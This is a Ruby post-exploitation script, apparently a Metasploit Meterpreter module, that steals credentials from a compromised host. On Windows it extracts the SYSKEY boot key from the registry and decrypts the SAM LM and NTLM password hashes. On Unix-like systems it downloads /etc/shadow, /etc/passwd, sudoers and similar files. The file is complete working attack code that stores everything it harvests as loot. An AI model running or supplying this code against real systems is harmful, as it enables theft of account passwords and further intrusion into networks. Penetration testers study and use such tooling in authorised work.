##
# $Id$
##

#
# Collect the Windows hashes
#
def grab_hashes
        #No point to run hashdump if we didn't get system.
	#Meant for the Java meterpreter issue (Bug #4427)
        if @client.sys.config.getuid !~ /SYSTEM/
                print_error("Not SYSTEM. Will skip hash dumping.")
                return
        end


	print_status("Collecting the Windows hashes")

	# Constants for SAM decryption
	@sam_lmpass   = "LMPASSWORD\x00"
	@sam_ntpass   = "NTPASSWORD\x00"
	@sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
	@sam_numeric  = "0123456789012345678901234567890123456789\x00"
	@sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
	@sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

	@des_odd_parity = [
	1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
	16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
	112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
	128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
	145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
	161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
	176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
	193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
	208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
	224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
	241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
	]

	def capture_boot_key
		bootkey = ""
		basekey = "System\\CurrentControlSet\\Control\\Lsa"
		%W{JD Skew1 GBG Data}.each do |k|
			ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
			return nil if not ok
			bootkey << [ok.query_class.to_i(16)].pack("V")
			ok.close
		end

		keybytes    = bootkey.unpack("C*")
		descrambled = ""
	#	descrambler = [ 0x08, 0x05, 0x04, 0x02, 0x0b, 0x09, 0x0d, 0x03, 0x00, 0x06, 0x01, 0x0c, 0x0e, 0x0a, 0x0f, 0x07 ]
		descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

		0.upto(keybytes.length-1) do |x|
			descrambled << [ keybytes[ descrambler[x] ] ].pack("C")
		end


		descrambled
	end

	def capture_hboot_key(bootkey)
		ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
		return if not ok
		vf = ok.query_value("F")
		return if not vf
		vf = vf.data
		ok.close

		hash = Digest::MD5.new
		hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)

		rc4 = OpenSSL::Cipher.new("RC4")
		rc4.key = hash.digest
		hbootkey  = rc4.update(vf[0x80, 32])
		hbootkey << rc4.final
		return hbootkey
	end

	def capture_user_keys
		users = {}
		ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
		return if not ok

		ok.enum_key.each do |usr|
			uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
			next if usr == 'Names'
			users[usr.to_i(16)] ||={}
			users[usr.to_i(16)][:F] = uk.query_value("F").data
			users[usr.to_i(16)][:V] = uk.query_value("V").data
			uk.close
		end
		ok.close

		ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
		ok.enum_key.each do |usr|
			uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
			r = uk.query_value("")
			rid = r.type
			users[rid] ||= {}
			users[rid][:Name] = usr
			uk.close
		end
		ok.close
		users
	end

	def decrypt_user_keys(hbootkey, users)
		users.each_key do |rid|
			user = users[rid]

			hashlm_off = nil
			hashnt_off = nil
			hashlm_enc = nil
			hashnt_enc = nil

			hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc

			# Lanman and NTLM hash available
			if(hoff + 0x28 < user[:V].length)
				hashlm_off = hoff +  4
				hashnt_off = hoff + 24
				hashlm_enc = user[:V][hashlm_off, 16]
				hashnt_enc = user[:V][hashnt_off, 16]
			# No stored lanman hash
			elsif (hoff + 0x14 < user[:V].length)
				hashnt_off = hoff + 8
				hashnt_enc = user[:V][hashnt_off, 16]
				hashlm_enc = ""
			# No stored hashes at all
			else
				hashnt_enc = hashlm_enc = ""
			end
			user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
			user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
		end

		users
	end

	def convert_des_56_to_64(kstr)
		key = []
		str = kstr.unpack("C*")

		key[0] = str[0] >> 1
		key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
		key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
		key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
		key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
		key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
		key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
		key[7] = str[6] & 0x7F

		0.upto(7) do |i|
			key[i] = ( key[i] << 1)
			key[i] = @des_odd_parity[key[i]]
		end

		key.pack("C*")
	end

	def rid_to_key(rid)

		s1 = [rid].pack("V")
		s1 << s1[0,3]

		s2b = [rid].pack("V").unpack("C4")
		s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
		s2 << s2[0,3]

		[convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
	end

	def decrypt_user_hash(rid, hbootkey, enchash, pass)

		if(enchash.empty?)
			case pass
			when @sam_lmpass
				return @sam_empty_lm
			when @sam_ntpass
				return @sam_empty_nt
			end
			return ""
		end

		des_k1, des_k2 = rid_to_key(rid)

		d1 = OpenSSL::Cipher.new('des-ecb')
		d1.padding = 0
		d1.key = des_k1

		d2 = OpenSSL::Cipher.new('des-ecb')
		d2.padding = 0
		d2.key = des_k2

		md5 = Digest::MD5.new
		md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

		rc4 = OpenSSL::Cipher.new('RC4')
		rc4.key = md5.digest
		okey = rc4.update(enchash)

		d1o  = d1.decrypt.update(okey[0,8])
		d1o << d1.final

		d2o  = d2.decrypt.update(okey[8,8])
		d1o << d2.final
		d1o + d2o
	end

	# Windows will lock the registry something like 8% of the time, in testing.
	# If it has 15% chance of locking each attempt, trying 5 times will get 
	# success 99.992% (1 - (0.15**5)) of the time.
	registry_tries = 0
	registry_success = false
	while !registry_success and registry_tries <= 5 
		registry_tries += 1
		begin
			print_status("Obtaining the boot key...")
			bootkey  = capture_boot_key

			print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
			hbootkey = capture_hboot_key(bootkey)

			print_status("Obtaining the user list and keys...")
			users    = capture_user_keys

			print_status("Decrypting user keys...")
			users    = decrypt_user_keys(hbootkey, users)

			print_status("Dumping password hashes...")
			print_line()
			print_line()

			allhashes = ''

			users.keys.sort{|a,b| a<=>b}.each do |rid|
				hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
				cred_info = {
					:host  => client.sock.peerhost,
					:sname => 'smb',
					:user  => users[rid][:Name].downcase,
					:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
					:type  => "smb_hash",
					:collect_type => "smb_hash",
					:active => true
				}
				source_user = (@client.exploit_datastore['SMBUser'] || @client.exploit_datastore['USERNAME'])
				source_pass = (@client.exploit_datastore['SMBPass'] || @client.exploit_datastore['PASSWORD'])
				if (source_user and !source_user.empty?)
					cred_info.merge!({
						:collect_user => source_user,
						:collect_pass => source_pass
					})
				else
					cred_info.merge!(:collect_session => @client.sid)
				end
				pro.store_cred(cred_info)
				allhashes << hashstring + "\n"
			end

			#
			# Store what we found
			#
			pro.store_loot("host.windows.pwdump", "text/plain", client, allhashes) if not allhashes.empty?
			registry_success = true # It worked this time

		rescue ::Rex::Post::Meterpreter::RequestError => e
			case e.code
			when 5 # Access denied
				print_error "Insufficient privileges to dump hashes: #{e.class} #{e} (#{e.code})"
				# Don't bother, we're not likely to suddenly get permissions in a quarter second from now.
				registry_tries = 10
			else # Code 6 is file handle invalid. Other errors may be recoverable, may as well try. 
				print_error("Attempt #{registry_tries}: unable to dump hashes: #{e.class} #{e} (#{e.code})")
				if registry_tries <= 5
					print_status("Retrying...") 
					select(nil,nil,nil,0.25)
				else
					print_error "Unrecoverable error condition. Giving up."
				end
			end
		end
	end # while loop
end

def grab_passwd
	print_status("Collecting the password file.")

	target_files = [
		{:file => "/etc/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd" },
		{:file => "/etc/shadow", :ltype => "host.unix.shadow", :ctype => "text/plain", :name => "shadow" },
		{:file => "/etc/master.passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "master.passwd" },
		{:file => "/etc/security/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "security.passwd" },
		{:file => "/.secure/etc/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd" },
		{:file => "/etc/security/passwd.adjunct", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd.adjunct" },
		{:file => "/etc/group", :ltype => "host.unix.group", :ctype => "text/plain", :name => "group" },
		{:file => "/etc/gshadow", :ltype => "host.unix.gshadow", :ctype => "text/plain", :name => "gshadow" },
		{:file => "/etc/sudoers", :ltype => "host.unix.sudoers", :ctype => "text/plain", :name => "sudoers" },
		{:file => "/etc/passwd-", :ltype => "host.unix.passwd.backup", :ctype => "text/plain", :name => "passwd-" },
		{:file => "/etc/shadow-", :ltype => "host.unix.shadow.backup", :ctype => "text/plain", :name => "shadow-" },
		{:file => "/etc/group-", :ltype => "host.unix.group.backup", :ctype => "text/plain", :name => "group-" },
		{:file => "/etc/gshadow-", :ltype => "host.unix.gshadow.backup", :ctype => "text/plain", :name => "gshadow-" },
	]

	target_files.each do |ent|
		begin
			fd = client.fs.file.new(ent[:file], "rb")
		rescue
			next
		end
		print_status("Downloading file #{ent[:file]}")
		data = ''
		while not fd.eof?
			data << fd.read
		end
		fd.close

		if data and data.strip.length > 0
			pro.store_loot(ent[:ltype], ent[:ctype], client, data.strip, ent[:name], ent[:file])
		end
	end
end

begin
	os = client.sys.config.sysinfo["OS"]
	case (os.downcase)
	when /win/
		grab_hashes
	else
		grab_passwd
	end

rescue ::Interrupt
	raise $!
rescue ::Exception => e
	print_error("Error: #{e.class} #{e} #{e.backtrace}")
end

